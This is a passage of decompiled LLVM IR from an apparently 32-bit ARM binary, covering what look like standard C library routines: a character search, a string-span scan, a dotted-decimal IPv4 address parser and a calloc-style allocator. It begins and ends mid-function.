  store i32 0, i32* @r5, align 4
  store i32 %arg1, i32* @r0, align 4
  %v2_17ccc3 = call i32 @function_12308(i32 %arg1, i32 %v1_17c9c)
  %v2_17cd05 = icmp eq i32 %v2_17ccc3, 0
  br i1 %v2_17cd05, label %dec_label_pc_17cd8, label %dec_label_pc_17cbc

dec_label_pc_17cb0:                               ; preds = %dec_label_pc_17c98
  %v2_17cb4 = call i32 @function_12308(i32 %arg1, i32 0)
  br label %dec_label_pc_17cdc

dec_label_pc_17cbc:                               ; preds = %dec_label_pc_17cc4.preheader, %dec_label_pc_17cbc
  %v2_17ccc6 = phi i32 [ %v2_17ccc, %dec_label_pc_17cbc ], [ %v2_17ccc3, %dec_label_pc_17cc4.preheader ]
  store i32 %v2_17ccc6, i32* @r5, align 4
  %v1_17cc0 = add i32 %v2_17ccc6, 1
  store i32 %v1_17cc0, i32* @r0, align 4
  %v0_17cc8 = load i32, i32* @r4, align 4
  %v2_17ccc = call i32 @function_12308(i32 %v1_17cc0, i32 %v0_17cc8)
  %v2_17cd0 = icmp eq i32 %v2_17ccc, 0
  br i1 %v2_17cd0, label %dec_label_pc_17cd8, label %dec_label_pc_17cbc

dec_label_pc_17cd8:                               ; preds = %dec_label_pc_17cbc, %dec_label_pc_17cc4.preheader
  %v0_17cd8 = load i32, i32* @r5, align 4
  br label %dec_label_pc_17cdc

dec_label_pc_17cdc:                               ; preds = %dec_label_pc_17cb0, %dec_label_pc_17cd8
  %storemerge = phi i32 [ %v2_17cb4, %dec_label_pc_17cb0 ], [ %v0_17cd8, %dec_label_pc_17cd8 ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v2_17ccc, { 1, 0 }
  uselistorder i32 %v1_17cc0, { 1, 0 }
  uselistorder i32 %v1_17c9c, { 2, 1, 0 }
  uselistorder i32 (i32, i32)* @function_12308, { 2, 1, 0, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3 }
  uselistorder i32 %arg1, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_17cdc, { 1, 0 }
  uselistorder label %dec_label_pc_17cbc, { 1, 0 }
}

define i32 @function_17ce8(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_17ce8:
  store i32 %arg2, i32* @r2, align 4
  store i32 %arg1, i32* @r0, align 4
  %v6_17ce8 = load i32, i32* @r5, align 4
  store i32 %arg1, i32* @r5, align 4
  store i32 %arg2, i32* @r4, align 4
  %v0_17cf8 = call i32 @function_12050()
  %v0_17cfc = load i32, i32* @r5, align 4
  %v1_17cfc = load i32, i32* @r4, align 4
  %v2_17cfc = add i32 %v1_17cfc, %v0_17cfc
  store i32 %v6_17ce8, i32* @r5, align 4
  ret i32 %v2_17cfc
}

define i32 @function_17d0c(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_17d0c:
  %v1_17d10 = urem i32 %arg1, 256
  %v0_17d302 = load i32, i32* @r0, align 4
  %v1_17d303 = urem i32 %v0_17d302, 4
  %v2_17d304 = icmp eq i32 %v1_17d303, 0
  br i1 %v2_17d304, label %dec_label_pc_17d38, label %dec_label_pc_17d18

dec_label_pc_17d18:                               ; preds = %dec_label_pc_17d0c, %dec_label_pc_17d2c
  %v0_17d2c = phi i32 [ %v1_17d2c, %dec_label_pc_17d2c ], [ %v0_17d302, %dec_label_pc_17d0c ]
  %v1_17d18 = inttoptr i32 %v0_17d2c to i8*
  %v2_17d18 = load i8, i8* %v1_17d18, align 1
  %v3_17d18 = zext i8 %v2_17d18 to i32
  %v9_17d1c = icmp eq i32 %v3_17d18, %v1_17d10
  br i1 %v9_17d1c, label %dec_label_pc_17de8, label %dec_label_pc_17d24

dec_label_pc_17d24:                               ; preds = %dec_label_pc_17d18
  %v2_17d24 = icmp eq i8 %v2_17d18, 0
  br i1 %v2_17d24, label %dec_label_pc_17de8, label %dec_label_pc_17d2c

dec_label_pc_17d2c:                               ; preds = %dec_label_pc_17d24
  %v1_17d2c = add i32 %v0_17d2c, 1
  %v1_17d30 = urem i32 %v1_17d2c, 4
  %v2_17d30 = icmp eq i32 %v1_17d30, 0
  br i1 %v2_17d30, label %dec_label_pc_17d38, label %dec_label_pc_17d18

dec_label_pc_17d38:                               ; preds = %dec_label_pc_17d2c, %dec_label_pc_17d0c
  %v0_17d3c = phi i32 [ %v0_17d302, %dec_label_pc_17d0c ], [ %v1_17d2c, %dec_label_pc_17d2c ]
  %v4_17d38 = mul nuw nsw i32 %v1_17d10, 256
  %v5_17d38 = or i32 %v4_17d38, %v1_17d10
  %v4_17d40 = mul i32 %v5_17d38, 65536
  %v5_17d40 = or i32 %v4_17d40, %v5_17d38
  br label %dec_label_pc_17d44

dec_label_pc_17d44:                               ; preds = %dec_label_pc_17de0, %dec_label_pc_17d80, %dec_label_pc_17d38
  %v0_17da8 = phi i32 [ %v0_17d3c, %dec_label_pc_17d38 ], [ %v4_17d44, %dec_label_pc_17d80 ], [ %v4_17d44, %dec_label_pc_17de0 ]
  %v1_17d44 = inttoptr i32 %v0_17da8 to i32*
  %v2_17d44 = load i32, i32* %v1_17d44, align 4
  %v4_17d44 = add i32 %v0_17da8, 4
  %v2_17d4c = xor i32 %v2_17d44, %v5_17d40
  %v2_17d50 = add i32 %v2_17d4c, 2130640639
  store i32 %v2_17d50, i32* @ip, align 4
  %v2_17d58 = add i32 %v2_17d44, 2130640639
  %v1_17d5c = sub i32 -1, %v2_17d44
  %v2_17d60 = xor i32 %v2_17d58, %v1_17d5c
  %v2_17d6c = and i32 %v2_17d60, -2130640640
  %v2_17d74 = icmp eq i32 %v2_17d6c, 0
  br i1 %v2_17d74, label %dec_label_pc_17d80, label %dec_label_pc_17d88

dec_label_pc_17d80:                               ; preds = %dec_label_pc_17d44
  %v1_17d68 = sub i32 -1, %v2_17d4c
  %v2_17d70 = xor i32 %v2_17d50, %v1_17d68
  %v2_17d78 = and i32 %v2_17d70, -2130640640
  %v2_17d80 = icmp eq i32 %v2_17d78, 0
  br i1 %v2_17d80, label %dec_label_pc_17d44, label %dec_label_pc_17d88

dec_label_pc_17d88:                               ; preds = %dec_label_pc_17d44, %dec_label_pc_17d80
  %v2_17d88 = inttoptr i32 %v0_17da8 to i8*
  %v3_17d88 = load i8, i8* %v2_17d88, align 1
  %v4_17d88 = zext i8 %v3_17d88 to i32
  %v9_17d8c = icmp eq i32 %v4_17d88, %v1_17d10
  br i1 %v9_17d8c, label %dec_label_pc_17de8, label %dec_label_pc_17d98

dec_label_pc_17d98:                               ; preds = %dec_label_pc_17d88
  %v2_17d98 = icmp eq i8 %v3_17d88, 0
  br i1 %v2_17d98, label %dec_label_pc_17de8, label %dec_label_pc_17da0

dec_label_pc_17da0:                               ; preds = %dec_label_pc_17d98
  %v1_17da0 = add i32 %v0_17da8, 1
  %v2_17da0 = inttoptr i32 %v1_17da0 to i8*
  %v3_17da0 = load i8, i8* %v2_17da0, align 1
  %v4_17da0 = zext i8 %v3_17da0 to i32
  %v9_17da4 = icmp eq i32 %v4_17da0, %v1_17d10
  br i1 %v9_17da4, label %dec_label_pc_17de8, label %dec_label_pc_17db0

dec_label_pc_17db0:                               ; preds = %dec_label_pc_17da0
  %v2_17db0 = icmp eq i8 %v3_17da0, 0
  br i1 %v2_17db0, label %dec_label_pc_17de8, label %dec_label_pc_17db8

dec_label_pc_17db8:                               ; preds = %dec_label_pc_17db0
  %v1_17db8 = add i32 %v0_17da8, 2
  %v2_17db8 = inttoptr i32 %v1_17db8 to i8*
  %v3_17db8 = load i8, i8* %v2_17db8, align 1
  %v4_17db8 = zext i8 %v3_17db8 to i32
  %v9_17dbc = icmp eq i32 %v4_17db8, %v1_17d10
  br i1 %v9_17dbc, label %dec_label_pc_17de8, label %dec_label_pc_17dc8

dec_label_pc_17dc8:                               ; preds = %dec_label_pc_17db8
  %v2_17dc8 = icmp eq i8 %v3_17db8, 0
  br i1 %v2_17dc8, label %dec_label_pc_17de8, label %dec_label_pc_17dd0

dec_label_pc_17dd0:                               ; preds = %dec_label_pc_17dc8
  %v1_17dd0 = add i32 %v0_17da8, 3
  %v2_17dd0 = inttoptr i32 %v1_17dd0 to i8*
  %v3_17dd0 = load i8, i8* %v2_17dd0, align 1
  %v4_17dd0 = zext i8 %v3_17dd0 to i32
  %v9_17dd4 = icmp eq i32 %v4_17dd0, %v1_17d10
  br i1 %v9_17dd4, label %dec_label_pc_17de8, label %dec_label_pc_17de0

dec_label_pc_17de0:                               ; preds = %dec_label_pc_17dd0
  %v2_17de0 = icmp eq i8 %v3_17dd0, 0
  br i1 %v2_17de0, label %dec_label_pc_17de8, label %dec_label_pc_17d44

dec_label_pc_17de8:                               ; preds = %dec_label_pc_17d24, %dec_label_pc_17d18, %dec_label_pc_17de0, %dec_label_pc_17dd0, %dec_label_pc_17dc8, %dec_label_pc_17db8, %dec_label_pc_17db0, %dec_label_pc_17da0, %dec_label_pc_17d98, %dec_label_pc_17d88
  %v1_17dec = phi i32 [ %v1_17dd0, %dec_label_pc_17de0 ], [ %v1_17dd0, %dec_label_pc_17dd0 ], [ %v1_17db8, %dec_label_pc_17dc8 ], [ %v1_17db8, %dec_label_pc_17db8 ], [ %v1_17da0, %dec_label_pc_17db0 ], [ %v1_17da0, %dec_label_pc_17da0 ], [ %v0_17da8, %dec_label_pc_17d98 ], [ %v0_17da8, %dec_label_pc_17d88 ], [ %v0_17d2c, %dec_label_pc_17d18 ], [ %v0_17d2c, %dec_label_pc_17d24 ]
  ret i32 %v1_17dec

; uselistorder directives
  uselistorder i32 %v4_17d44, { 1, 0 }
  uselistorder i32 %v2_17d44, { 0, 2, 1 }
  uselistorder i32 %v0_17da8, { 0, 1, 2, 3, 4, 5, 7, 6 }
  uselistorder i32 %v5_17d38, { 1, 0 }
  uselistorder i32 %v1_17d2c, { 1, 0, 2 }
  uselistorder i32 %v0_17d302, { 2, 1, 0 }
  uselistorder i32 %v1_17d10, { 2, 3, 4, 5, 6, 0, 1 }
  uselistorder i32 -2130640640, { 0, 1, 2, 6, 3, 4, 5 }
  uselistorder i32 2130640639, { 2, 6, 7, 3, 0, 8, 9, 4, 1, 5, 10 }
  uselistorder label %dec_label_pc_17de8, { 2, 3, 4, 5, 6, 7, 8, 9, 0, 1 }
  uselistorder label %dec_label_pc_17d88, { 1, 0 }
  uselistorder label %dec_label_pc_17d18, { 1, 0 }
}

define i32 @function_17df8(i8* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_17df8:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_17e24

dec_label_pc_17e00:                               ; preds = %dec_label_pc_17e10
  %v3_17e10 = zext i8 %v2_17e10 to i32
  %v1_17e18 = add i32 %v0_17e18, 1
  %v1_17e00 = load i32, i32* %r0.global-to-local, align 4
  %v9_17e00 = icmp eq i32 %v3_17e10, %v1_17e00
  br i1 %v9_17e00, label %dec_label_pc_17e08, label %dec_label_pc_17e10

dec_label_pc_17e08:                               ; preds = %dec_label_pc_17e00
  %v0_17e08 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v0_17e08, i32* %r0.global-to-local, align 4
  ret i32 %v0_17e08

dec_label_pc_17e10:                               ; preds = %dec_label_pc_17e00, %dec_label_pc_17e24
  %v0_17e18 = phi i32 [ %v1_17e18, %dec_label_pc_17e00 ], [ %arg2, %dec_label_pc_17e24 ]
  %v1_17e10 = inttoptr i32 %v0_17e18 to i8*
  %v2_17e10 = load i8, i8* %v1_17e10, align 1
  %v2_17e14 = icmp eq i8 %v2_17e10, 0
  br i1 %v2_17e14, label %dec_label_pc_17e20, label %dec_label_pc_17e00

dec_label_pc_17e20:                               ; preds = %dec_label_pc_17e10
  %v0_17e20 = load i32, i32* %r2.global-to-local, align 4
  %v1_17e20 = add i32 %v0_17e20, 1
  br label %dec_label_pc_17e24

dec_label_pc_17e24:                               ; preds = %dec_label_pc_17df8, %dec_label_pc_17e20
  %storemerge = phi i32 [ %tmp, %dec_label_pc_17df8 ], [ %v1_17e20, %dec_label_pc_17e20 ]
  store i32 %storemerge, i32* %r2.global-to-local, align 4
  %v1_17e24 = inttoptr i32 %storemerge to i8*
  %v2_17e24 = load i8, i8* %v1_17e24, align 1
  %v3_17e24 = zext i8 %v2_17e24 to i32
  store i32 %v3_17e24, i32* %r0.global-to-local, align 4
  %v2_17e28 = icmp eq i8 %v2_17e24, 0
  %v0_17e2c = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v2_17e28, i32 %v0_17e2c)
  br label %dec_label_pc_17e10

; uselistorder directives
  uselistorder i32 %v0_17e18, { 1, 0 }
  uselistorder i32* %r2.global-to-local, { 2, 0, 1 }
  uselistorder i32* %r0.global-to-local, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_17e24, { 1, 0 }
  uselistorder label %dec_label_pc_17e10, { 1, 0 }
}

define i32 @function_17e38() local_unnamed_addr {
dec_label_pc_17e38:
  %r0.global-to-local = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %v3_17e38 = load i32, i32* @r4, align 4
  store i32 %v3_17e38, i32* %stack_var_-28, align 4
  %v0_17e40 = load i32, i32* @r0, align 4
  %v2_17e40 = icmp eq i32 %v0_17e40, 0
  %v0_17e48 = load i32, i32* @r1, align 4
  br i1 %v2_17e40, label %dec_label_pc_17f1c, label %dec_label_pc_17e50

dec_label_pc_17e50:                               ; preds = %dec_label_pc_17e38
  br label %dec_label_pc_17e68

dec_label_pc_17e68:                               ; preds = %dec_label_pc_17e50, %dec_label_pc_17ee0
  %v1_17ee0 = phi i32 [ 0, %dec_label_pc_17e50 ], [ %v5_17ee0, %dec_label_pc_17ee0 ]
  %v0_17ee4 = phi i32 [ 1, %dec_label_pc_17e50 ], [ %v1_17ee4, %dec_label_pc_17ee0 ]
  %v0_17e68 = phi i32 [ %v0_17e40, %dec_label_pc_17e50 ], [ %v0_17e6812, %dec_label_pc_17ee0 ]
  %v1_17e68 = inttoptr i32 %v0_17e68 to i8*
  %v2_17e68 = load i8, i8* %v1_17e68, align 1
  %v3_17e68 = zext i8 %v2_17e68 to i32
  %v4_17e6c = load i32, i32* inttoptr (i32 144528 to i32*), align 16
  %v2_17e70 = mul nuw nsw i32 %v3_17e68, 2
  %v2_17e74 = add i32 %v2_17e70, %v4_17e6c
  %v3_17e74 = inttoptr i32 %v2_17e74 to i16*
  %v4_17e74 = load i16, i16* %v3_17e74, align 2
  %v1_17e78 = and i16 %v4_17e74, 8
  %v2_17e78 = icmp eq i16 %v1_17e78, 0
  br i1 %v2_17e78, label %dec_label_pc_17f1c, label %dec_label_pc_17e80

dec_label_pc_17e80:                               ; preds = %dec_label_pc_17e68
  store i32 0, i32* @ip, align 4
  br label %dec_label_pc_17ea0

dec_label_pc_17e88:                               ; preds = %dec_label_pc_17ea0
  %v2_17e88 = mul i32 %v0_17ee0, 10
  %v1_17e8c = add i32 %v2_17e88, -48
  %v2_17e90 = add i32 %v3_17ea0, %v1_17e8c
  store i32 %v2_17e90, i32* @ip, align 4
  %v8_17e98 = icmp sgt i32 %v2_17e90, 255
  br i1 %v8_17e98, label %dec_label_pc_17f1c, label %dec_label_pc_17e9c

dec_label_pc_17e9c:                               ; preds = %dec_label_pc_17e88
  %v1_17e9c = add i32 %v0_17ed0, 1
  store i32 %v1_17e9c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_17ea0

dec_label_pc_17ea0:                               ; preds = %dec_label_pc_17e80, %dec_label_pc_17e9c
  %v0_17ee0 = phi i32 [ 0, %dec_label_pc_17e80 ], [ %v2_17e90, %dec_label_pc_17e9c ]
  %v0_17ed0 = phi i32 [ %v0_17e68, %dec_label_pc_17e80 ], [ %v1_17e9c, %dec_label_pc_17e9c ]
  %v1_17ea0 = inttoptr i32 %v0_17ed0 to i8*
  %v2_17ea0 = load i8, i8* %v1_17ea0, align 1
  %v3_17ea0 = zext i8 %v2_17ea0 to i32
  %v2_17ea4 = mul nuw nsw i32 %v3_17ea0, 2
  %v2_17ea8 = add i32 %v2_17ea4, %v4_17e6c
  %v3_17ea8 = inttoptr i32 %v2_17ea8 to i16*
  %v4_17ea8 = load i16, i16* %v3_17ea8, align 2
  %v6_17ea8 = zext i16 %v4_17ea8 to i32
  %v1_17eac = and i32 %v6_17ea8, 8
  %v2_17eac = icmp eq i32 %v1_17eac, 0
  br i1 %v2_17eac, label %dec_label_pc_17eb4, label %dec_label_pc_17e88

dec_label_pc_17eb4:                               ; preds = %dec_label_pc_17ea0
  %v7_17eb4 = icmp eq i32 %v0_17ee4, 4
  br i1 %v7_17eb4, label %dec_label_pc_17ecc, label %dec_label_pc_17ebc

dec_label_pc_17ebc:                               ; preds = %dec_label_pc_17eb4
  %v7_17ebc = icmp eq i8 %v2_17ea0, 46
  br i1 %v7_17ebc, label %dec_label_pc_17ec4, label %dec_label_pc_17f1c

dec_label_pc_17ec4:                               ; preds = %dec_label_pc_17ebc
  %v1_17ec4 = add i32 %v0_17ed0, 1
  store i32 %v1_17ec4, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_17ee0

dec_label_pc_17ecc:                               ; preds = %dec_label_pc_17eb4
  %v2_17ecc = icmp eq i8 %v2_17ea0, 0
  %v1_17ed0 = add i32 %v0_17ed0, 1
  store i32 %v1_17ed0, i32* %r0.global-to-local, align 4
  br i1 %v2_17ecc, label %dec_label_pc_17ee0, label %dec_label_pc_17ed8

dec_label_pc_17ed8:                               ; preds = %dec_label_pc_17ecc
  %v1_17ed8 = and i32 %v6_17ea8, 32
  %v2_17ed8 = icmp eq i32 %v1_17ed8, 0
  br i1 %v2_17ed8, label %dec_label_pc_17f1c, label %dec_label_pc_17ee0

dec_label_pc_17ee0:                               ; preds = %dec_label_pc_17ed8, %dec_label_pc_17ecc, %dec_label_pc_17ec4
  %v0_17e6812 = phi i32 [ %v1_17ed0, %dec_label_pc_17ed8 ], [ %v1_17ed0, %dec_label_pc_17ecc ], [ %v1_17ec4, %dec_label_pc_17ec4 ]
  %v4_17ee0 = mul i32 %v1_17ee0, 256
  %v5_17ee0 = or i32 %v0_17ee0, %v4_17ee0
  %v1_17ee4 = add nuw nsw i32 %v0_17ee4, 1
  %v7_17eec = icmp slt i32 %v1_17ee4, 5
  br i1 %v7_17eec, label %dec_label_pc_17e68, label %dec_label_pc_17ef0

dec_label_pc_17ef0:                               ; preds = %dec_label_pc_17ee0
  %v2_17ef0 = icmp eq i32 %v0_17e48, 0
  br i1 %v2_17ef0, label %.thread7.thread, label %bb

.thread7.thread:                                  ; preds = %dec_label_pc_17ef0
  store i32 1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_17f20

bb:                                               ; preds = %dec_label_pc_17ef0
  %v4_17ef4 = udiv i32 %v5_17ee0, 16777216
  %v2_17ef8 = udiv i32 %v5_17ee0, 256
  %v5_17efc = and i32 %v2_17ef8, 65280
  %v2_17f00 = and i32 %v5_17ee0, 65280
  %v5_17f04 = mul nuw nsw i32 %v2_17f00, 256
  %v5_17f08 = mul i32 %v0_17ee0, 16777216
  %v6_17efc = or i32 %v4_17ef4, %v5_17f08
  %v6_17f04 = or i32 %v6_17efc, %v5_17efc
  %v6_17f08 = or i32 %v6_17f04, %v5_17f04
  store i32 1, i32* %r0.global-to-local, align 4
  %v3_17f14 = inttoptr i32 %v0_17e48 to i32*
  store i32 %v6_17f08, i32* %v3_17f14, align 4
  %v2_17f20.pre = load i32, i32* %stack_var_-28, align 4
  %v1_17f24.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_17f20

dec_label_pc_17f1c:                               ; preds = %dec_label_pc_17ebc, %dec_label_pc_17ed8, %dec_label_pc_17e68, %dec_label_pc_17e88, %dec_label_pc_17e38
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_17f20

dec_label_pc_17f20:                               ; preds = %.thread7.thread, %bb, %dec_label_pc_17f1c
  %v1_17f24 = phi i32 [ %v1_17f24.pre, %bb ], [ 0, %dec_label_pc_17f1c ], [ 1, %.thread7.thread ]
  %v2_17f20 = phi i32 [ %v2_17f20.pre, %bb ], [ %v3_17e38, %dec_label_pc_17f1c ], [ %v3_17e38, %.thread7.thread ]
  store i32 %v2_17f20, i32* @r4, align 4
  ret i32 %v1_17f24

; uselistorder directives
  uselistorder i32 %v1_17ee4, { 1, 0 }
  uselistorder i32 %v5_17ee0, { 2, 0, 1, 3 }
  uselistorder i32 %v0_17ed0, { 0, 1, 3, 2 }
  uselistorder i32* %r0.global-to-local, { 3, 1, 2, 0, 4, 5, 6 }
  uselistorder i32 65280, { 5, 1, 2, 3, 4, 0, 6 }
  uselistorder i8 0, { 4, 36, 35, 5, 6, 7, 8, 9, 38, 37, 23, 39, 1, 40, 41, 3, 42, 21, 22, 44, 45, 43, 46, 48, 47, 24, 49, 10, 50, 51, 52, 33, 11, 12, 13, 14, 15, 16, 53, 54, 55, 56, 57, 25, 59, 60, 61, 62, 58, 17, 18, 0, 63, 64, 65, 19, 67, 66, 20, 68, 69, 70, 26, 71, 72, 2, 74, 27, 75, 76, 73, 77, 78, 79, 80, 82, 81, 83, 86, 84, 85, 87, 90, 88, 89, 91, 112, 113, 109, 110, 111, 105, 106, 107, 108, 103, 104, 100, 101, 102, 98, 99, 97, 95, 94, 96, 92, 93, 114, 115, 116, 117, 118, 120, 119, 122, 121, 123, 28, 125, 124, 34, 126, 29, 127, 129, 130, 128, 30, 131, 132, 32, 133, 31, 134 }
  uselistorder i32 10, { 2, 20, 21, 23, 7, 24, 25, 8, 26, 9, 10, 22, 6, 0, 31, 32, 11, 37, 27, 28, 29, 12, 30, 14, 13, 33, 34, 5, 35, 3, 1, 36, 15, 4, 17, 18, 16, 19, 38 }
  uselistorder label %dec_label_pc_17f20, { 2, 1, 0 }
  uselistorder label %dec_label_pc_17f1c, { 1, 0, 3, 2, 4 }
  uselistorder label %dec_label_pc_17ea0, { 1, 0 }
  uselistorder label %dec_label_pc_17e68, { 1, 0 }
}

define i32 @function_17f30(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_17f30:
  %ip.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %v3_17f30 = load i32, i32* @r4, align 4
  %v6_17f30 = load i32, i32* @r5, align 4
  %v9_17f30 = load i32, i32* @r6, align 4
  %v12_17f30 = load i32, i32* @lr, align 4
  %v2_17f38 = icmp eq i32 %arg1, 0
  store i32 144312, i32* @r5, align 4
  store i32 %arg2, i32* @r4, align 4
  %v2_17f48 = mul i32 %arg2, %arg1
  store i32 %v2_17f48, i32* @r6, align 4
  br i1 %v2_17f38, label %dec_label_pc_17f78, label %dec_label_pc_17f50

dec_label_pc_17f50:                               ; preds = %dec_label_pc_17f30
  store i32 %arg1, i32* @r1, align 4
  store i32 %v2_17f48, i32* @r0, align 4
  %v0_17f58 = call i32 @function_102cc()
  %v0_17f5c = load i32, i32* @r4, align 4
  %v9_17f5c = icmp eq i32 %v0_17f5c, %v0_17f58
  br i1 %v9_17f5c, label %dec_label_pc_17f50.dec_label_pc_17f78_crit_edge, label %dec_label_pc_17f64

dec_label_pc_17f50.dec_label_pc_17f78_crit_edge:  ; preds = %dec_label_pc_17f50
  %v0_17f7c.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_17f78

dec_label_pc_17f64:                               ; preds = %dec_label_pc_17f50
  %v0_17f64 = call i32 @function_1095c()
  store i32 0, i32* %r4.global-to-local, align 4
  %v2_17f70 = inttoptr i32 %v0_17f64 to i32*
  store i32 12, i32* %v2_17f70, align 4
  br label %dec_label_pc_1803c

dec_label_pc_17f78:                               ; preds = %dec_label_pc_17f50.dec_label_pc_17f78_crit_edge, %dec_label_pc_17f30
  %v0_17f94 = phi i32 [ %v0_17f7c.pre, %dec_label_pc_17f50.dec_label_pc_17f78_crit_edge ], [ 144312, %dec_label_pc_17f30 ]
  %v2_17f7c = add i32 %v0_17f94, 72
  %v3_17f7c = inttoptr i32 %v2_17f7c to i32*
  %v4_17f7c = load i32, i32* %v3_17f7c, align 4
  store i32 %v4_17f7c, i32* @r4, align 4
  %v2_17f94 = add i32 %v0_17f94, 76
  %v3_17f94 = inttoptr i32 %v2_17f94 to i32*
  %v4_17f94 = load i32, i32* %v3_17f94, align 4
  store i32 %v4_17f94, i32* %ip.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_17f94)
  %v0_17fa8 = load i32, i32* @r5, align 4
  %v2_17fa8 = add i32 %v0_17fa8, 20
  %v3_17fa8 = inttoptr i32 %v2_17fa8 to i32*
  %v4_17fa8 = load i32, i32* %v3_17fa8, align 4
  store i32 %v4_17fa8, i32* %ip.global-to-local, align 4
  store i32 98228, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_17fa8)
  %v0_17fb4 = load i32, i32* @r6, align 4
  %v1_17fb8 = call i32 @function_12b00(i32 %v0_17fb4)
  store i32 %v1_17fb8, i32* %r4.global-to-local, align 4
  %v2_17fbc = icmp eq i32 %v1_17fb8, 0
  br i1 %v2_17fbc, label %.thread, label %dec_label_pc_17fc4

dec_label_pc_17fc4:                               ; preds = %dec_label_pc_17f78
  %v1_17fc4 = add i32 %v1_17fb8, -4
  %v2_17fc4 = inttoptr i32 %v1_17fc4 to i32*
  %v3_17fc4 = load i32, i32* %v2_17fc4, align 4
  %v1_17fc8 = and i32 %v3_17fc4, 2
  %v2_17fc8 = icmp eq i32 %v1_17fc8, 0
  br i1 %v2_17fc8, label %dec_label_pc_17fd0, label %.thread

dec_label_pc_17fd0:                               ; preds = %dec_label_pc_17fc4
  %v1_17fd07 = add i32 %v3_17fc4, -4
  %v1_17fd4 = and i32 %v1_17fd07, -4
  store i32 %v1_17fd4, i32* @r2, align 4
  %v3_17fd8 = udiv i32 %v1_17fd4, 4
  store i32 %v3_17fd8, i32* %ip.global-to-local, align 4
  %tmp = icmp eq i32 %v1_17fd4, 36
  %v2_17fe0 = icmp ult i32 %v1_17fd4, 33
  %v3_17fe0 = or i1 %tmp, %v2_17fe0
  br i1 %v3_17fe0, label %dec_label_pc_17fec, label %dec_label_pc_17fe4

dec_label_pc_17fe4:                               ; preds = %dec_label_pc_17fd0
  %v2_17fe4 = inttoptr i32 %v1_17fb8 to i8*
  %v3_17fe4 = call i32 @function_11f30(i8* %v2_17fe4, i32 0)
  br label %.thread

dec_label_pc_17fec:                               ; preds = %dec_label_pc_17fd0
  %tmp8 = icmp eq i32 %v1_17fd4, 16
  %v2_17ff0 = inttoptr i32 %v1_17fb8 to i32*
  store i32 0, i32* %v2_17ff0, align 4
  %v1_17ff4 = load i32, i32* %r4.global-to-local, align 4
  %v2_17ff4 = add i32 %v1_17ff4, 4
  %v3_17ff4 = inttoptr i32 %v2_17ff4 to i32*
  store i32 0, i32* %v3_17ff4, align 4
  %v1_17ff8 = load i32, i32* %r4.global-to-local, align 4
  %v2_17ff8 = add i32 %v1_17ff8, 8
  %v3_17ff8 = inttoptr i32 %v2_17ff8 to i32*
  store i32 0, i32* %v3_17ff8, align 4
  %v2_17ffc = icmp ult i32 %v1_17fd4, 13
  %v3_17ffc = or i1 %tmp8, %v2_17ffc
  br i1 %v3_17ffc, label %.thread, label %dec_label_pc_18000

dec_label_pc_18000:                               ; preds = %dec_label_pc_17fec
  %v0_18000 = load i32, i32* %ip.global-to-local, align 4
  %v1_18004 = load i32, i32* %r4.global-to-local, align 4
  %v2_18004 = add i32 %v1_18004, 12
  %v3_18004 = inttoptr i32 %v2_18004 to i32*
  store i32 0, i32* %v3_18004, align 4
  %v1_18008 = load i32, i32* %r4.global-to-local, align 4
  %v2_18008 = add i32 %v1_18008, 16
  %v3_18008 = inttoptr i32 %v2_18008 to i32*
  store i32 0, i32* %v3_18008, align 4
  %tmp9 = icmp ult i32 %v0_18000, 7
  br i1 %tmp9, label %.thread, label %dec_label_pc_18010

dec_label_pc_18010:                               ; preds = %dec_label_pc_18000
  %v0_18010 = load i32, i32* %ip.global-to-local, align 4
  %v7_18010 = icmp eq i32 %v0_18010, 9
  %v1_18014 = load i32, i32* %r4.global-to-local, align 4
  %v2_18014 = add i32 %v1_18014, 20
  %v3_18014 = inttoptr i32 %v2_18014 to i32*
  store i32 0, i32* %v3_18014, align 4
  %v1_18018 = load i32, i32* %r4.global-to-local, align 4
  %v2_18018 = add i32 %v1_18018, 24
  %v3_18018 = inttoptr i32 %v2_18018 to i32*
  store i32 0, i32* %v3_18018, align 4
  br i1 %v7_18010, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_18010
  %v2_1801c = load i32, i32* %r4.global-to-local, align 4
  %v3_1801c = add i32 %v2_1801c, 32
  %v4_1801c = inttoptr i32 %v3_1801c to i32*
  store i32 0, i32* %v4_1801c, align 4
  %v2_18020 = load i32, i32* %r4.global-to-local, align 4
  %v3_18020 = add i32 %v2_18020, 28
  %v4_18020 = inttoptr i32 %v3_18020 to i32*
  store i32 0, i32* %v4_18020, align 4
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_18010, %dec_label_pc_17fc4, %dec_label_pc_18000, %dec_label_pc_17fec, %dec_label_pc_17f78, %dec_label_pc_17fe4, %bb
  %v0_18030 = load i32, i32* @r5, align 4
  %v2_18030 = add i32 %v0_18030, 28
  %v3_18030 = inttoptr i32 %v2_18030 to i32*
  %v4_18030 = load i32, i32* %v3_18030, align 4
  store i32 %v4_18030, i32* @ip, align 4
  call void @__pseudo_branch(i32 %v4_18030)
  br label %dec_label_pc_1803c

dec_label_pc_1803c:                               ; preds = %dec_label_pc_17f64, %.thread
  %v0_1803c = load i32, i32* %r4.global-to-local, align 4
